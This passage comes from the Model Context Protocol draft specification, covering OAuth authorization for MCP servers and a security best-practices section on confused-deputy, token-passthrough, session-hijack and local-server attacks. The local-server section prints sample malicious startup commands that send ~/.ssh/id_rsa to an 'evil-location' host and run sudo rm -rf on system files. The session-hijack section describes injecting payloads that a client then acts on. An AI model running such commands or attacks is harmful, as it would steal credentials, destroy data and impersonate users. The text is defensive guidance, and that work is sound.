Handling](#scope-challenge-handling) section.\n\n## Authorization Flow Steps\n\nThe complete Authorization flow proceeds as follows:\n\n```mermaid\nsequenceDiagram\n    participant B as User-Agent (Browser)\n    participant C as Client\n    participant M as MCP Server (Resource Server)\n    participant A as Authorization Server\n\n    C->>M: MCP request without token\n    M->>C: HTTP 401 Unauthorized with WWW-Authenticate header\n    Note over C: Extract resource_metadata URL from WWW-Authenticate\n\n    C->>M: Request Protected Resource Metadata\n    M->>C: Return metadata\n\n    Note over C: Parse metadata and extract authorization server(s)<br/>Client determines AS to use\n\n    C->>A: GET Authorization server metadata endpoint\n    Note over C,A: Try OAuth 2.0 and OpenID Connect<br/>discovery endpoints in priority order\n    A-->>C: Authorization server metadata\n\n    alt Client ID Metadata Documents\n        Note over C: Client uses HTTPS URL as client_id\n        Note over A: Server detects URL-formatted client_id\n        A->>C: Fetch metadata from client_id URL\n        C-->>A: JSON metadata document\n        Note over A: Validate metadata and redirect_uris\n    else Dynamic client registration\n        C->>A: POST /register\n        A->>C: Client Credentials\n    else Pre-registered client\n        Note over C: Use existing client_id\n    end\n\n    Note over C: Generate PKCE parameters<br/>Include resource parameter<br/>Apply scope selection strategy\n    C->>B: Open browser with authorization URL + code_challenge + resource\n    B->>A: Authorization request with resource parameter\n    Note over A: User authorizes\n    A->>B: Redirect to callback with authorization code\n    B->>C: Authorization code callback\n    C->>A: Token request + code_verifier + resource\n    A->>C: Access token (+ refresh token)\n    C->>M: MCP request with access token\n    M-->>C: MCP response\n    Note over C,M: MCP communication continues with valid token\n```\n\n## Resource Parameter Implementation\n\nMCP clients **MUST** implement Resource Indicators for OAuth 2.0 as defined in [RFC 8707](https://www.rfc-editor.org/rfc/rfc8707.html)\nto explicitly specify the target resource for which the token is being requested. The `resource` parameter:\n\n1. **MUST** be included in both authorization requests and token requests.\n2. **MUST** identify the MCP server that the client intends to use the token with.\n3. **MUST** use the canonical URI of the MCP server as defined in [RFC 8707 Section 2](https://www.rfc-editor.org/rfc/rfc8707.html#name-access-token-request).\n\n### Canonical Server URI\n\nFor the purposes of this specification, the canonical URI of an MCP server is defined as the resource identifier as specified in\n[RFC 8707 Section 2](https://www.rfc-editor.org/rfc/rfc8707.html#section-2) and aligns with the `resource` parameter in\n[RFC 9728](https://datatracker.ietf.org/doc/html/rfc9728).\n\nMCP clients **SHOULD** provide the most specific URI that they can for the MCP server they intend to access, following the guidance in [RFC 8707](https://www.rfc-editor.org/rfc/rfc8707). While the canonical form uses lowercase scheme and host components, implementations **SHOULD** accept uppercase scheme and host components for robustness and interoperability.\n\nExamples of valid canonical URIs:\n\n- `https://mcp.example.com/mcp`\n- `https://mcp.example.com`\n- `https://mcp.example.com:8443`\n- `https://mcp.example.com/server/mcp` (when path component is necessary to identify individual MCP server)\n\nExamples of invalid canonical URIs:\n\n- `mcp.example.com` (missing scheme)\n- `https://mcp.example.com#fragment` (contains fragment)\n\n> **Note:** While both `https://mcp.example.com/` (with trailing slash) and `https://mcp.example.com` (without trailing slash) are technically valid absolute URIs according to [RFC 3986](https://www.rfc-editor.org/rfc/rfc3986), implementations **SHOULD** consistently use the form without the trailing slash for better interoperability unless the trailing slash is semantically significant for the specific resource.\n\nFor example, if accessing an MCP server at `https://mcp.example.com`, the authorization request would include:\n\n```\n&resource=https%3A%2F%2Fmcp.example.com\n```\n\nMCP clients **MUST** send this parameter regardless of whether authorization servers support it.\n\n## Access Token Usage\n\n### Token Requirements\n\nAccess token handling when making requests to MCP servers **MUST** conform to the requirements defined in\n[OAuth 2.1 Section 5 \"Resource Requests\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5).\nSpecifically:\n\n1. MCP client **MUST** use the Authorization request header field defined in\n   [OAuth 2.1 Section 5.1.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.1.1):\n\n```\nAuthorization: Bearer <access-token>\n```\n\nNote that authorization **MUST** be included in every HTTP request from client to server,\neven if they are part of the same logical session.\n\n2. Access tokens **MUST NOT** be included in the URI query string\n\nExample request:\n\n```http\nGET /mcp HTTP/1.1\nHost: mcp.example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...\n```\n\n### Token Handling\n\nMCP servers, acting in their role as an OAuth 2.1 resource server, **MUST** validate access tokens as described in\n[OAuth 2.1 Section 5.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.2).\nMCP servers **MUST** validate that access tokens were issued specifically for them as the intended audience,\naccording to [RFC 8707 Section 2](https://www.rfc-editor.org/rfc/rfc8707.html#section-2).\nIf validation fails, servers **MUST** respond according to\n[OAuth 2.1 Section 5.3](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.3)\nerror handling requirements. Invalid or expired tokens **MUST** receive a HTTP 401\nresponse.\n\nMCP clients **MUST NOT** send tokens to the MCP server other than ones issued by the MCP server's authorization server.\n\nMCP servers **MUST** only accept tokens that are valid for use with their\nown resources.\n\nMCP servers **MUST NOT** accept or transit any other tokens.\n\n## Error Handling\n\nServers **MUST** return appropriate HTTP status codes for authorization errors:\n\n| Status Code | Description  | Usage                                      |\n| ----------- | ------------ | ------------------------------------------ |\n| 401         | Unauthorized | Authorization required or token invalid    |\n| 403         | Forbidden    | Invalid scopes or insufficient permissions |\n| 400         | Bad Request  | Malformed authorization request            |\n\n### Scope Challenge Handling\n\nThis section covers handling insufficient scope errors during runtime operations when\na client already has a token but needs additional permissions. This follows the error\nhandling patterns defined in [OAuth 2.1 Section 5](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5)\nand leverages the metadata fields from [RFC 9728 (OAuth 2.0 Protected Resource Metadata)](https://datatracker.ietf.org/doc/html/rfc9728).\n\n#### Runtime Insufficient Scope Errors\n\nWhen a client makes a request with an access token with insufficient\nscope during runtime operations, the server **SHOULD** respond with:\n\n- `HTTP 403 Forbidden` status code (per [RFC 6750 Section 3.1](https://datatracker.ietf.org/doc/html/rfc6750#section-3.1))\n- `WWW-Authenticate` header with the `Bearer` scheme and additional parameters:\n  - `error=\"insufficient_scope\"` - indicating the specific type of authorization failure\n  - `scope=\"required_scope1 required_scope2\"` - specifying the minimum scopes needed for the operation\n  - `resource_metadata` - the URI of the Protected Resource Metadata document (for consistency with 401 responses)\n  - `error_description` (optional) - human-readable description of the error\n\n**Server Scope Management**: When responding with insufficient scope errors, servers\n**SHOULD** include the scopes needed to satisfy the current request in the `scope`\nparameter.\n\nServers have flexibility in determining which scopes to include:\n\n- **Minimum approach**: Include the newly-required scopes for the specific operation. Include any existing granted scopes as well, if they are required, to prevent clients from losing previously granted permissions.\n- **Recommended approach**: Include both existing relevant scopes and newly required scopes to prevent clients from losing previously granted permissions\n- **Extended approach**: Include existing scopes, newly required scopes, and related scopes that commonly work together\n\nThe choice depends on the server's assessment of user experience impact and authorization friction.\n\nServers **SHOULD** be consistent in their scope inclusion strategy to provide predictable behavior for clients.\n\nServers **SHOULD** consider the user experience impact when determining which scopes to include in the\nresponse, as misconfigured scopes may require frequent user interaction.\n\nExample insufficient scope response:\n\n```http\nHTTP/1.1 403 Forbidden\nWWW-Authenticate: Bearer error=\"insufficient_scope\",\n                         scope=\"files:read files:write user:profile\",\n                         resource_metadata=\"https://mcp.example.com/.well-known/oauth-protected-resource\",\n                         error_description=\"Additional file write permission required\"\n```\n\n#### Step-Up Authorization Flow\n\nClients will receive scope-related errors during initial authorization or at runtime (`insufficient_scope`).\nClients **SHOULD** respond to these errors by requesting a new access token with an increased set of scopes via a step-up authorization flow or handle the errors in other, appropriate ways.\nClients acting on behalf of a user **SHOULD** attempt the step-up authorization flow. Clients acting on their own behalf (`client_credentials` clients)\n**MAY** attempt the step-up authorization flow or abort the request immediately.\n\nThe flow is as follows:\n\n1. **Parse error information** from the authorization server response or `WWW-Authenticate` header\n2. **Determine required scopes** as outlined in [Scope Selection Strategy](#scope-selection-strategy).\n3. **Initiate (re-)authorization** with the determined scope set\n4. **Retry the original request** with the new authorization no more than a few times and treat this as a permanent authorization failure\n\nClients **SHOULD** implement retry limits and **SHOULD** track scope upgrade attempts to avoid\nrepeated failures for the same resource and operation combination.\n\n## Security Considerations\n\nImplementations **MUST** follow OAuth 2.1 security best practices as laid out in [OAuth 2.1 Section 7. \"Security Considerations\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#name-security-considerations).\n\n### Token Audience Binding and Validation\n\n[RFC 8707](https://www.rfc-editor.org/rfc/rfc8707.html) Resource Indicators provide critical security benefits by binding tokens to their intended\naudiences **when the Authorization Server supports the capability**. To enable current and future adoption:\n\n- MCP clients **MUST** include the `resource` parameter in authorization and token requests as specified in the [Resource Parameter Implementation](#resource-parameter-implementation) section\n- MCP servers **MUST** validate that tokens presented to them were specifically issued for their use\n\nThe [Security Best Practices document](/specification/draft/basic/security_best_practices#token-passthrough)\noutlines why token audience validation is crucial and why token passthrough is explicitly forbidden.\n\n### Token Theft\n\nAttackers who obtain tokens stored by the client, or tokens cached or logged on the server can access protected resources with\nrequests that appear legitimate to resource servers.\n\nClients and servers **MUST** implement secure token storage and follow OAuth best practices,\nas outlined in [OAuth 2.1, Section 7.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.1).\n\nAuthorization servers **SHOULD** issue short-lived access tokens to reduce the impact of leaked tokens.\nFor public clients, authorization servers **MUST** rotate refresh tokens as described in [OAuth 2.1 Section 4.3.1 \"Token Endpoint Extension\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-4.3.1).\n\n### Communication Security\n\nImplementations **MUST** follow [OAuth 2.1 Section 1.5 \"Communication Security\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-1.5).\n\nSpecifically:\n\n1. All authorization server endpoints **MUST** be served over HTTPS.\n1. All redirect URIs **MUST** be either `localhost` or use HTTPS.\n\n### Authorization Code Protection\n\nAn attacker who has gained access to an authorization code contained in an authorization response can try to redeem the authorization code for an access token or otherwise make use of the authorization code.\n(Further described in [OAuth 2.1 Section 7.5](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.5))\n\nTo mitigate this, MCP clients **MUST** implement PKCE according to [OAuth 2.1 Section 7.5.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.5.2) and **MUST** verify PKCE support before proceeding with authorization.\nPKCE helps prevent authorization code interception and injection attacks by requiring clients to create a secret verifier-challenge pair, ensuring that only the original requestor can exchange an authorization code for tokens.\n\nMCP clients **MUST** use the `S256` code challenge method when technically capable, as required by [OAuth 2.1 Section 4.1.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-4.1.1).\n\nSince OAuth 2.1 and PKCE specifications do not define a mechanism for clients to discover PKCE support, MCP clients **MUST** rely on authorization server metadata to verify this capability:\n\n- **OAuth 2.0 Authorization Server Metadata**: If `code_challenge_methods_supported` is absent, the authorization server does not support PKCE and MCP clients **MUST** refuse to proceed.\n\n- **OpenID Connect Discovery 1.0**: While the [OpenID Provider Metadata](https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderMetadata) does not define `code_challenge_methods_supported`, this field is commonly included by OpenID providers. MCP clients **MUST** verify the presence of `code_challenge_methods_supported` in the provider metadata response. If the field is absent, MCP clients **MUST** refuse to proceed.\n\nAuthorization servers providing OpenID Connect Discovery 1.0 **MUST** include `code_challenge_methods_supported` in their metadata to ensure MCP compatibility.\n\n### Open Redirection\n\nAn attacker may craft malicious redirect URIs to direct users to phishing sites.\n\nMCP clients **MUST** have redirect URIs registered with the authorization server.\n\nAuthorization servers **MUST** validate exact redirect URIs against pre-registered values to prevent redirection attacks.\n\nMCP clients **SHOULD** use and verify state parameters in the authorization code flow\nand discard any results that do not include or have a mismatch with the original state.\n\nAuthorization servers **MUST** take precautions to prevent redirecting user agents to untrusted URI's, following suggestions laid out in [OAuth 2.1 Section 7.12.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.12.2)\n\nAuthorization servers **SHOULD** only automatically redirect the user agent if it trusts the redirection URI. If the URI is not trusted, the authorization server MAY inform the user and rely on the user to make the correct decision.\n\n### Client ID Metadata Document Security\n\nWhen implementing Client ID Metadata Documents, authorization servers **MUST** consider the security implications\ndetailed in [OAuth Client ID Metadata Document, Section 6](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00#name-security-considerations).\nKey considerations include:\n\n#### Authorization Server Abuse Protection\n\nThe authorization server takes a URL as input from an unknown client and fetches that URL.\nA malicious client could use this to trigger the authorization server to make requests to arbitrary URLs,\nsuch as requests to private administration endpoints the authorization server has access to.\n\nAuthorization servers fetching metadata documents **SHOULD** consider\n[Server-Side Request Forgery (SSRF)](https://developer.mozilla.org/docs/Web/Security/Attacks/SSRF) risks, as described in [OAuth Client ID Metadata Document: Server Side Request Forgery (SSRF) Attacks](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00#name-server-side-request-forgery).\n\n#### Localhost Redirect URI Risks\n\nClient ID Metadata Documents cannot prevent `localhost` URL impersonation by themselves. An attacker can claim to be any client by:\n\n1. Providing the legitimate client's metadata URL as their `client_id`\n2. Binding to the any `localhost` port, and providing that address as the redirect_uri\n3. Receiving the authorization code via the redirect when the user approves\n\nThe server will see the legitimate client's metadata document and the user will see the legitimate client's name, making attack detection difficult.\n\nAuthorization servers:\n\n- **SHOULD** display additional warnings for `localhost`-only redirect URIs\n- **MAY** require additional attestation mechanisms for enhanced security\n- **MUST** clearly display the redirect URI hostname during authorization\n\n#### Trust Policies\n\nAuthorization servers **MAY** implement domain-based trust policies:\n\n- Allowlists for trusted domains (for protected servers)\n- Accept any HTTPS `client_id` (for open servers)\n- Reputation checks for unknown domains\n- Restrictions based on domain age or certificate validation\n- Display the CIMD and other associated client hostnames prominently to prevent phishing\n\nServers maintain full control over their access policies.\n\n### Confused Deputy Problem\n\nAttackers can exploit MCP servers acting as intermediaries to third-party APIs, leading to [confused deputy vulnerabilities](/specification/draft/basic/security_best_practices#confused-deputy-problem).\nBy using stolen authorization codes, they can obtain access tokens without user consent.\n\nMCP proxy servers using static client IDs **MUST** obtain user consent for each dynamically\nregistered client before forwarding to third-party authorization servers (which may require additional consent).\n\n### Access Token Privilege Restriction\n\nAn attacker can gain unauthorized access or otherwise compromise an MCP server if the server accepts tokens issued for other resources.\n\nThis vulnerability has two critical dimensions:\n\n1. **Audience validation failures.** When an MCP server doesn't verify that tokens were specifically intended for it (for example, via the audience claim, as mentioned in [RFC9068](https://www.rfc-editor.org/rfc/rfc9068.html)), it may accept tokens originally issued for other services. This breaks a fundamental OAuth security boundary, allowing attackers to reuse legitimate tokens across different services than intended.\n2. **Token passthrough.** If the MCP server not only accepts tokens with incorrect audiences but also forwards these unmodified tokens to downstream services, it can potentially cause the [\"confused deputy\" problem](#confused-deputy-problem), where the downstream API may incorrectly trust the token as if it came from the MCP server or assume the token was validated by the upstream API. See the [Token Passthrough section](/specification/draft/basic/security_best_practices#token-passthrough) of the Security Best Practices guide for additional details.\n\nMCP servers **MUST** validate access tokens before processing the request, ensuring the access token is issued specifically for the MCP server, and take all necessary steps to ensure no data is returned to unauthorized parties.\n\nA MCP server **MUST** follow the guidelines in [OAuth 2.1 - Section 5.2](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#section-5.2) to validate inbound tokens.\n\nMCP servers **MUST** only accept tokens specifically intended for themselves and **MUST** reject tokens that do not include them in the audience claim or otherwise verify that they are the intended recipient of the token. See the [Security Best Practices Token Passthrough section](/specification/draft/basic/security_best_practices#token-passthrough) for details.\n\nIf the MCP server makes requests to upstream APIs, it may act as an OAuth client to them. The access token used at the upstream API is a separate token, issued by the upstream authorization server. The MCP server **MUST NOT** pass through the token it received from the MCP client.\n\nMCP clients **MUST** implement and use the `resource` parameter as defined in [RFC 8707 - Resource Indicators for OAuth 2.0](https://www.rfc-editor.org/rfc/rfc8707.html)\nto explicitly specify the target resource for which the token is being requested. This requirement aligns with the recommendation in\n[RFC 9728 Section 7.4](https://datatracker.ietf.org/doc/html/rfc9728#section-7.4). This ensures that access tokens are bound to their intended resources and\ncannot be misused across different services.\n\n## MCP Authorization Extensions\n\nThere are several authorization extensions to the core protocol that define additional authorization mechanisms. These extensions are:\n\n- **Optional** - Implementations can choose to adopt these extensions\n- **Additive** - Extensions do not modify or break core protocol functionality; they add new capabilities while preserving core protocol behavior\n- **Composable** - Extensions are modular and designed to work together without conflicts, allowing implementations to adopt multiple extensions simultaneously\n- **Versioned independently** - Extensions follow the core MCP versioning cycle but may adopt independent versioning as needed\n\nA list of supported extensions can be found in the [MCP Authorization Extensions](https://github.com/modelcontextprotocol/ext-auth) repository.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/specification/draft/basic/security_best_practices.mdx","content":"---\ntitle: Security Best Practices\n---\n\n<div id=\"enable-section-numbers\" />\n\n## Introduction\n\n### Purpose and Scope\n\nThis document provides security considerations for the Model Context Protocol (MCP), complementing the [MCP Authorization](../basic/authorization.mdx) specification. This document identifies security risks, attack vectors, and best practices specific to MCP implementations.\n\nThe primary audience for this document includes developers implementing MCP authorization flows, MCP server operators, and security professionals evaluating MCP-based systems. This document should be read alongside the MCP Authorization specification and [OAuth 2.0 security best practices](https://datatracker.ietf.org/doc/html/rfc9700).\n\n## Attacks and Mitigations\n\nThis section gives a detailed description of attacks on MCP implementations, along with potential countermeasures.\n\n### Confused Deputy Problem\n\nAttackers can exploit MCP proxy servers that connect to third-party APIs, creating \"[confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)\" vulnerabilities. This attack allows malicious clients to obtain authorization codes without proper user consent by exploiting the combination of static client IDs, dynamic client registration, and consent cookies.\n\n#### Terminology\n\n**MCP Proxy Server**\n: An MCP server that connects MCP clients to third-party APIs, offering MCP features while delegating operations and acting as a single OAuth client to the third-party API server.\n\n**Third-Party Authorization Server**\n: Authorization server that protects the third-party API. It may lack dynamic client registration support, requiring the MCP proxy to use a static client ID for all requests.\n\n**Third-Party API**\n: The protected resource server that provides the actual API functionality. Access to this\nAPI requires tokens issued by the third-party authorization server.\n\n**Static Client ID**\n: A fixed OAuth 2.0 client identifier used by the MCP proxy server when communicating with\nthe third-party authorization server. This Client ID refers to the MCP server acting as a client\nto the Third-Party API. It is the same value for all MCP server to Third-Party API interactions regardless of\nwhich MCP client initiated the request.\n\n#### Vulnerable Conditions\n\nThis attack becomes possible when all of the following conditions are present:\n\n- MCP proxy server uses a **static client ID** with a third-party authorization server\n- MCP proxy server allows MCP clients to **dynamically register** (each getting their own client_id)\n- The third-party authorization server sets a **consent cookie** after the first authorization\n- MCP proxy server does not implement proper per-client consent before forwarding to third-party authorization\n\n#### Architecture and Attack Flows\n\n##### Normal OAuth proxy usage (preserves user consent)\n\n```mermaid\nsequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant MC as MCP Client\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n\n    Note over UA,M: Initial Auth flow completed\n\n    Note over UA,TAS: Step 1: Legitimate user consent for Third Party Server\n\n    M->>UA: Redirect to third party authorization server\n    UA->>TAS: Authorization request (client_id: mcp-proxy)\n    TAS->>UA: Authorization consent screen\n    Note over UA: Review consent screen\n    UA->>TAS: Approve\n    TAS->>UA: Set consent cookie for client ID: mcp-proxy\n    TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com\n    UA->>M: 3P Authorization code\n    Note over M,TAS: Exchange 3P code for 3P token\n    Note over M: Generate MCP authorization code\n    M->>UA: Redirect to MCP Client with MCP authorization code\n\n    Note over M,UA: Exchange code for token, etc.\n```\n\n##### Malicious OAuth proxy usage (skips user consent)\n\n```mermaid\nsequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n    participant A as Attacker\n\n\n    Note over UA,A: Step 2: Attack (leveraging existing cookie, skipping consent)\n    A->>M: Dynamically register malicious client, redirect_uri: attacker.com\n    A->>UA: Sends malicious link\n    UA->>TAS: Authorization request (client_id: mcp-proxy) + consent cookie\n    rect rgba(255, 17, 0, 0.67)\n    TAS->>TAS: Cookie present, consent skipped\n    end\n\n   TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com\n   UA->>M: 3P Authorization code\n   Note over M,TAS: Exchange 3P code for 3P token\n   Note over M: Generate MCP authorization code\n   M->>UA: Redirect to attacker.com with MCP Authorization code\n   UA->>A: MCP Authorization code delivered to attacker.com\n   Note over M,A: Attacker exchanges MCP code for MCP token\n   A->>M: Attacker impersonates user to MCP server\n```\n\n#### Attack Description\n\nWhen an MCP proxy server uses a static client ID to authenticate with a third-party\nauthorization server, the following attack becomes possible:\n\n1. A user authenticates normally through the MCP proxy server to access the third-party API\n2. During this flow, the third-party authorization server sets a cookie on the user agent\n   indicating consent for the static client ID\n3. An attacker later sends the user a malicious link containing a crafted authorization request which contains a malicious redirect URI along with a new dynamically registered client ID\n4. When the user clicks the link, their browser still has the consent cookie from the previous legitimate request\n5. The third-party authorization server detects the cookie and skips the consent screen\n6. The MCP authorization code is redirected to the attacker's server (specified in the malicious `redirect_uri` parameter during [dynamic client registration](/specification/draft/basic/authorization#dynamic-client-registration))\n7. The attacker exchanges the stolen authorization code for access tokens for the MCP server without the user's explicit approval\n8. The attacker now has access to the third-party API as the compromised user\n\n#### Mitigation\n\nTo prevent confused deputy attacks, MCP proxy servers **MUST** implement per-client consent and proper security controls as detailed below.\n\n##### Consent Flow Implementation\n\nThe following diagram shows how to properly implement per-client consent that runs **before** the third-party authorization flow:\n\n```mermaid\nsequenceDiagram\n    participant Client as MCP Client\n    participant Browser as User's Browser\n    participant MCP as MCP Server\n    participant ThirdParty as Third-Party AuthZ Server\n\n    Note over Client,ThirdParty: 1.

Proper state validation ensures that consent approval at the authorization endpoint is enforced at the callback endpoint.\n\nMCP proxy servers implementing OAuth flows **MUST**:\n\n- Generate a cryptographically secure random `state` value for each authorization request\n- Store the `state` value server-side (in a secure session store or encrypted cookie) **only after** consent has been explicitly approved\n- Set the `state` tracking cookie/session **immediately before** redirecting to the third-party identity provider (not before consent approval)\n- Validate at the callback endpoint that the `state` query parameter exactly matches the stored value in the callback request's cookies or in the request's cookie-based session\n- Reject any callback requests where the `state` parameter is missing or does not match\n- Ensure `state` values are single-use (delete after validation) and have a short expiration time (e.g., 10 minutes)\n\nThe consent cookie or session containing the `state` value **MUST NOT** be set until **after** the user has approved the consent screen at the MCP server's authorization endpoint. Setting this cookie before consent approval renders the consent screen ineffective, as an attacker could bypass it by crafting a malicious authorization request.\n\n### Token Passthrough\n\n\"Token passthrough\" is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued _to the MCP server_ and passes them through to the downstream API.\n\n#### Risks\n\nToken passthrough is explicitly forbidden in the [authorization specification](/specification/draft/basic/authorization) as it introduces a number of security risks, that include:\n\n- **Security Control Circumvention**\n  - The MCP Server or downstream APIs might implement important security controls like rate limiting, request validation, or traffic monitoring, that depend on the token audience or other credential constraints. If clients can obtain and use tokens directly with the downstream APIs without the MCP server validating them properly or ensuring that the tokens are issued for the right service, they bypass these controls.\n- **Accountability and Audit Trail Issues**\n  - The MCP Server will be unable to identify or distinguish between MCP Clients when clients are calling with an upstream-issued access token which may be opaque to the MCP Server.\n  - The downstream Resource Server’s logs may show requests that appear to come from a different source with a different identity, rather than the MCP server that is actually forwarding the tokens.\n  - Both factors make incident investigation, controls, and auditing more difficult.\n  - If the MCP Server passes tokens without validating their claims (e.g., roles, privileges, or audience) or other metadata, a malicious actor in possession of a stolen token can use the server as a proxy for data exfiltration.\n- **Trust Boundary Issues**\n  - The downstream Resource Server grants trust to specific entities. This trust might include assumptions about origin or client behavior patterns. Breaking this trust boundary could lead to unexpected issues.\n  - If the token is accepted by multiple services without proper validation, an attacker compromising one service can use the token to access other connected services.\n- **Future Compatibility Risk**\n  - Even if an MCP Server starts as a \"pure proxy\" today, it might need to add security controls later. Starting with proper token audience separation makes it easier to evolve the security model.\n\n#### Mitigation\n\nMCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server.\n\n### Session Hijacking\n\nSession hijacking is an attack vector where a client is provided a session ID by the server, and an unauthorized party is able to obtain and use that same session ID to impersonate the original client and perform unauthorized actions on their behalf.\n\n#### Session Hijack Prompt Injection\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant ServerA\n    participant Queue\n    participant ServerB\n    participant Attacker\n\n    Client->>ServerA: Initialize (connect to streamable HTTP server)\n    ServerA-->>Client: Respond with session ID\n\n    Attacker->>ServerB: Access/guess session ID\n    Note right of Attacker: Attacker knows/guesses session ID\n\n    Attacker->>ServerB: Trigger event (malicious payload, using session ID)\n    ServerB->>Queue: Enqueue event (keyed by session ID)\n\n    ServerA->>Queue: Poll for events (using session ID)\n    Queue-->>ServerA: Event data (malicious payload)\n\n    ServerA-->>Client: Async response (malicious payload)\n    Client->>Client: Acts based on malicious payload\n```\n\n#### Session Hijack Impersonation\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n    participant Attacker\n\n    Client->>Server: Initialize (login/authenticate)\n    Server-->>Client: Respond with session ID (persistent session created)\n\n    Attacker->>Server: Access/guess session ID\n    Note right of Attacker: Attacker knows/guesses session ID\n\n    Attacker->>Server: Make API call (using session ID, no re-auth)\n    Server-->>Attacker: Respond as if Attacker is Client (session hijack)\n```\n\n#### Attack Description\n\nWhen you have multiple stateful HTTP servers that handle MCP requests, the following attack vectors are possible:\n\n**Session Hijack Prompt Injection**\n\n1. The client connects to **Server A** and receives a session ID.\n1. The attacker obtains an existing session ID and sends a malicious event to **Server B** with said session ID.\n   - When a server supports [redelivery/resumable streams](/specification/draft/basic/transports#resumability-and-redelivery), deliberately terminating the request before receiving the response could lead to it being resumed by the original client via the GET request for server sent events.\n   - If a particular server initiates server sent events as a consequence of a tool call such as a `notifications/tools/list_changed`, where it is possible to affect the tools that are offered by the server, a client could end up with tools that they were not aware were enabled.\n\n1. **Server B** enqueues the event (associated with session ID) into a shared queue.\n1. **Server A** polls the queue for events using the session ID and retrieves the malicious payload.\n1. **Server A** sends the malicious payload to the client as an asynchronous or resumed response.\n1. The client receives and acts on the malicious payload, leading to potential compromise.\n\n**Session Hijack Impersonation**\n\n1. The MCP client authenticates with the MCP server, creating a persistent session ID.\n2. The attacker obtains the session ID.\n3. The attacker makes calls to the MCP server using the session ID.\n4. MCP server does not check for additional authorization and treats the attacker as a legitimate user, allowing unauthorized access or actions.\n\n#### Mitigation\n\nTo prevent session hijacking and event injection attacks, the following mitigations should be implemented:\n\nMCP servers that implement authorization **MUST** verify all inbound requests.\nMCP Servers **MUST NOT** use sessions for authentication.\n\nMCP servers **MUST** use secure, non-deterministic session IDs.\nGenerated session IDs (e.g., UUIDs) **SHOULD** use secure random number generators. Avoid predictable or sequential session identifiers that could be guessed by an attacker. Rotating or expiring session IDs can also reduce the risk.\n\nMCP servers **SHOULD** bind session IDs to user-specific information.\nWhen storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.\n\nMCP servers can optionally leverage additional unique identifiers.\n\n### Local MCP Server Compromise\n\nLocal MCP servers are MCP Servers running on a user's local machine, either by the user downloading and executing a server, authoring a server themselves, or installing through a client's configuration flows. These servers may have direct access to the user's system and may be accessible to other processes running on the user's machine, making them attractive targets for attacks.\n\n#### Attack Description\n\nLocal MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible:\n\n1. An attacker includes a malicious \"startup\" command in a client configuration\n2. An attacker distributes a malicious payload inside the server itself\n3. An attacker accesses an insecure local server that's left running on localhost via DNS rebinding\n\nExample malicious startup commands that could be embedded:\n\n```bash\n# Data exfiltration\nnpx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location\n\n# Privilege escalation\nsudo rm -rf /important/system/files && echo \"MCP server installed!\"\n```\n\n#### Risks\n\nLocal MCP servers with inadequate restrictions or from untrusted sources introduce several critical security risks:\n\n- **Arbitrary code execution**. Attackers can execute any command with MCP client privileges.\n- **No visibility**. Users have no insight into what commands are being executed.\n- **Command obfuscation**. Malicious actors can use complex or convoluted commands to appear legitimate.\n- **Data exfiltration**. Attackers can access legitimate local MCP servers via compromised javascript.\n- **Data loss**. Attackers or bugs in legitimate servers could lead to irrecoverable data loss on the host machine.\n\n#### Mitigation\n\nIf an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands.\n\n**Pre-Configuration Consent**\n\nDisplay a clear consent dialog before connecting a new local MCP server via one-click configuration. The MCP client **MUST**:\n\n- Show the exact command that will be executed, without truncation (include arguments and parameters)\n- Clearly identify it as a potentially dangerous operation that executes code on the user's system\n- Require explicit user approval before proceeding\n- Allow users to cancel the configuration\n\nThe MCP client **SHOULD** implement additional checks and guardrails to mitigate potential code execution attack vectors:\n\n- Highlight potentially dangerous command patterns (e.g., commands containing `sudo`, `rm -rf`, network operations, file system access outside expected directories)\n- Display warnings for commands that access sensitive locations (home directory, SSH keys, system directories)\n- Warn that MCP servers run with the same privileges as the client\n- Execute MCP server commands in a sandboxed environment with minimal default privileges\n- Launch MCP servers with restricted access to the file system, network, and other system resources\n- Provide mechanisms for users to explicitly grant additional privileges (e.g., specific directory access, network access) when needed\n- Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)\n\nMCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes:\n\n- Use the 